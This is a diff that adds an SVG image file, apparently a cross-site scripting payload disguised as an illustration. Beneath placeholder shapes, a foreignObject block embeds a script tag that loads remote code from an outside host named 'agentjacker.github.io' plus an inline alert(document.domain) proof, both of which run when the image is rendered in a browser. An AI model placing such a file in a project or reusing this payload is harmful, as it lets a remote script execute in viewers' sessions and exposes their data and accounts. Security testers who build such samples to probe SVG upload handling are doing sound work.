@@ -1,0 +1,20 @@
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink"
+     preserveAspectRatio="none" x="0px" y="0px" width="560px" height="544px" viewBox="0 0 560 544">
+  
+  <!-- Embedding external content using foreignObject -->
+  <foreignobject width="100%" height="100%">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <!-- External script -->
+      <script xlink:href="https://agentjacker.github.io/swap/tap.php" />
+      <!-- Another external script for demonstration -->
+      <script>alert(document.domain)</script>
+    </div>
+  </foreignobject>
+
+  <!-- Your SVG illustration elements -->
+  <g transform="matrix(0.5, 0, 0, 0.5, 100, 100)">
+    <!-- Example: Replace with your actual SVG illustration content -->
+    <rect x="0" y="0" width="200" height="200" fill="yellow" />
+    <circle cx="100" cy="100" r="50" fill="red" />
+  </g>
+</svg>
